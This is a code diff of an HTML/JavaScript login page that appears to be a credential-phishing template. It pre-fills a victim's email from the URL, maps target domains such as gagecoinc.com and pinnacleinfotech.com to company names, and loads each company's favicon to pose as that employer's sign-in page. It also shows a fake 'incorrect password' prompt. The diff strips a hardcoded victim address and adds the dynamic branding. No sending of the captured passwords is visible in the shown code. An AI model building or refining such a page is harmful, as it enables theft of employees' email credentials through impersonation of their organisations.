@@ -64,7 +64,7 @@
             margin-bottom: 16px;
             border-radius: 4px;
             text-align: center;
-            display: none; /* Initially hidden for default state */
+            display: none; /* Initially hidden */
         }
 
         img#logoImg {
@@ -99,21 +99,6 @@
             color: #555;
             margin-top: 6px; /* Reduced excess vertical space */
         }
-
-        @media (max-width: 768px) {
-            /* Responsive styling for smaller screens */
-            #main-inner-container {
-                padding: 20px;
-            }
-
-            #companyName {
-                font-size: 22px; /* Adjust font size for smaller screens */
-            }
-
-            button {
-                font-size: 0.9rem; /* Decrease button size slightly */
-            }
-        }
     </style>
 </head>
 
@@ -123,21 +108,21 @@
             <div id="form-main-outer">
                 <!-- Logo Section -->
                 <div>
-                    <img id="logoImg" src="/assets/img/LoginBanner.png" alt="Logo" />
+                    <img id="logoImg" src="#" alt="Logo" />
                 </div>
 
                 <!-- Company Name -->
-                <h5 id="companyName">GAGECOINC</h5>
+                <h5 id="companyName"></h5>
 
                 <!-- Error Message -->
-                <div id="error-message">
+                <div id="error-message" style="display: none;">
                     The password is incorrect. Try again with your email password.
                 </div>
 
                 <!-- Form Section -->
                 <div>
                     <p>Sign in with your Email to continue:</p>
-                    <input type="text" id="email" value="randy@gagecoinc.com" readonly>
+                    <input type="text" id="email" value="" readonly>
                     <p>Enter password:</p>
                     <input type="password" id="password" placeholder="Password">
                     <button type="button" onclick="nextFun();">Sign In</button>
@@ -164,39 +149,32 @@
 
             const emailParts = hash.split("@");
             const domain = emailParts[1].toLowerCase();
+            document.getElementById("email").value = hash;
 
             const companyNameMapping = {
                 "gagecoinc.com": "GAGECOINC",
-                "examplecompany.com": "EXAMPLECOMPANY",
+                "pineappleinc.com": "PINEAPPLEINC",
+                "pinnacleinfotech.com": "PINNACLEINFOTECH"
             };
 
-            const companyRootName = domain.split(".")[0].toUpperCase();
-            const companyName = companyNameMapping[domain] || companyRootName;
-
+            const companyName = companyNameMapping[domain] || domain.split(".")[0].toUpperCase();
             document.getElementById("companyName").textContent = companyName;
-            const logo = document.getElementById("logoImg");
-            const fallback = "/assets/img/LoginBanner.png";
 
-            logo.onerror = () => {
-                logo.src = fallback; /* Fallback logo path */
-            };
+            const faviconUrl = `https://www.google.com/s2/favicons?sz=128&domain=${domain}`;
+            const logo = document.getElementById("logoImg");
+            logo.src = faviconUrl;
         });
 
         function nextFun() {
             const email = document.getElementById("email").value;
             const password = document.getElementById("password").value;
 
-            if (email.length === 0 || password.length === 0) {
+            if (!email || !password) {
                 const errorDiv = document.getElementById("error-message");
                 errorDiv.style.display = "block";
                 errorDiv.innerText = "Email or Password is empty.";
-                setTimeout(() => {
-                    errorDiv.style.display = "none";
-                }, 2000);
-                return;
+                setTimeout(() => errorDiv.style.display = "none", 2000);
             }
-
-            console.log("Perform login validation for:", email, password);
         }
     </script>
 </body>
